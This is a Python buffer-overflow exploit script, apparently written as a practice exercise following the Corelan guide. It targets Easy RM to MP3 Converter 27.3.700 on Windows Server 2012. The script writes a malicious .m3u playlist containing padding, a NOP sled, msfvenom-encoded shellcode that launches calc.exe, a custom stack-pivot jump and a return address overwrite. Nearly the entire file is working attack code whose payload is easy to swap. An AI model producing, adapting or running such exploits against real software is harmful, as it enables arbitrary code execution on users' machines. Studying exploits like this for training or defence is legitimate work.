#!/usr/bin/python

# Author: Michael Music
# Date: 2/23/2019
# Description: Easy RM to MP3 27.3.700 Buffer Overflow Exploit
#  Exercise in BOFs following the corelan guide
#  Tested on Windows Server 2012
# Notes: Required alteration in prepended \x41s and a custom JMP to shellcode
#  The goal of this exploit is to simulate a small shellcode region pointed to by ESP
#  It is assumed that we have a 50 byte space pointed to by ESP
#  The goal is to use a custom JMP to jump to the actual data used for overflow
#  which will contain shellcode. THIS IS A SLOPPY VERSION.
#  I will be creating other variations of this exploit to test other shellcode
#  execution methods


out = 'crash.m3u'
jmp_code = '\x83\xc4\x60\x83\xc4\x60\x83\xc4\x60\x83\xc4\x60\xff\xe4' #full jmp code, adds around 400 to esp then jmp esp 

# msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python -e x86/alpha_mixed

buf =  ""
buf += "\x89\xe0\xdb\xd3\xd9\x70\xf4\x5b\x53\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x69\x6c\x69\x78\x4d"
buf += "\x52\x63\x30\x63\x30\x33\x30\x33\x50\x6d\x59\x4b\x55"
buf += "\x70\x31\x79\x50\x45\x34\x4e\x6b\x30\x50\x30\x30\x4e"
buf += "\x6b\x30\x52\x46\x6c\x4e\x6b\x32\x72\x55\x44\x4c\x4b"
buf += "\x50\x72\x57\x58\x74\x4f\x4d\x67\x61\x5a\x77\x56\x74"
buf += "\x71\x79\x6f\x4e\x4c\x35\x6c\x30\x61\x63\x4c\x56\x62"
buf += "\x56\x4c\x37\x50\x69\x51\x7a\x6f\x66\x6d\x57\x71\x48"
buf += "\x47\x6b\x52\x58\x72\x53\x62\x63\x67\x6c\x4b\x36\x32"
buf += "\x74\x50\x6e\x6b\x53\x7a\x65\x6c\x6c\x4b\x30\x4c\x64"
buf += "\x51\x70\x78\x68\x63\x57\x38\x73\x31\x5a\x71\x70\x51"
buf += "\x6c\x4b\x52\x79\x57\x50\x47\x71\x6e\x33\x6e\x6b\x47"
buf += "\x39\x66\x78\x7a\x43\x44\x7a\x71\x59\x4c\x4b\x54\x74"
buf += "\x4c\x4b\x53\x31\x39\x46\x64\x71\x4b\x4f\x4c\x6c\x59"
buf += "\x51\x78\x4f\x36\x6d\x43\x31\x39\x57\x50\x38\x39\x70"
buf += "\x54\x35\x4a\x56\x34\x43\x63\x4d\x59\x68\x47\x4b\x73"
buf += "\x4d\x35\x74\x61\x65\x6d\x34\x66\x38\x4e\x6b\x33\x68"
buf += "\x47\x54\x73\x31\x6b\x63\x73\x56\x4c\x4b\x76\x6c\x72"
buf += "\x6b\x6c\x4b\x51\x48\x65\x4c\x47\x71\x68\x53\x6e\x6b"
buf += "\x37\x74\x6c\x4b\x75\x51\x58\x50\x4d\x59\x47\x34\x66"
buf += "\x44\x57\x54\x73\x6b\x73\x6b\x71\x71\x36\x39\x50\x5a"
buf += "\x66\x31\x69\x6f\x4b\x50\x53\x6f\x73\x6f\x50\x5a\x6e"
buf += "\x6b\x37\x62\x58\x6b\x6c\x4d\x71\x4d\x51\x7a\x37\x71"
buf += "\x4e\x6d\x6d\x55\x58\x32\x63\x30\x35\x50\x37\x70\x76"
buf += "\x30\x72\x48\x75\x61\x6c\x4b\x72\x4f\x6c\x47\x39\x6f"
buf += "\x4a\x75\x6f\x4b\x4a\x50\x48\x35\x4e\x42\x63\x66\x31"
buf += "\x78\x6d\x76\x6f\x65\x6f\x4d\x6d\x4d\x4b\x4f\x6e\x35"
buf += "\x35\x6c\x77\x76\x51\x6c\x44\x4a\x4d\x50\x79\x6b\x39"
buf += "\x70\x63\x45\x67\x75\x4f\x4b\x52\x67\x42\x33\x62\x52"
buf += "\x50\x6f\x70\x6a\x67\x70\x51\x43\x49\x6f\x5a\x75\x62"
buf += "\x43\x53\x51\x52\x4c\x50\x63\x64\x6e\x42\x45\x64\x38"
buf += "\x35\x35\x57\x70\x41\x41"

junk = ('\x41' * 330) + ('\x90' * 75) + buf + ('X' * (1000-330-75-448)) + ('\x41' * (26079-1000))

espdata = '\x43' * 350 #Junk data that, for this exercise, cannot contain shellcode
preshellcode = 'X' * 4 + jmp_code #4 byte offset + jmpcode (max of 50 bytes for this exercise)
address = '\x58\xb0\x01\x10' #Contains push esp ret, no jmp esp available

exploit_string = junk + address + preshellcode + espdata

text = open(out, 'w')
text.write(exploit_string)
text.close
